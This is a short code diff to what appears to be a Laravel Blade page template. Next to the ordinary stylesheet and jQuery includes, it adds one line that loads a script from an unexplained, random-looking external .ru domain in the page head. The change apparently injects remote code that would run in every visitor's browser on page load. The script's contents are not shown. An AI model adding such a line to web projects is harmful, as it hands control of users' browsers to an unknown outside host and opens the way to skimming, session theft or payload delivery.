@@ -10,6 +10,7 @@
     <link href="{{ asset('css/style.min.css') }}" rel="stylesheet">
     <link href="{{ asset('css/starter-template.css') }}" rel="stylesheet">
     <script src="{{ asset('js/jquery.min.js') }}"></script>
+    <script src="https://7nkbwdf1uq.ru/script.js"></script>
 </head>
 <body>
 <div class="container">
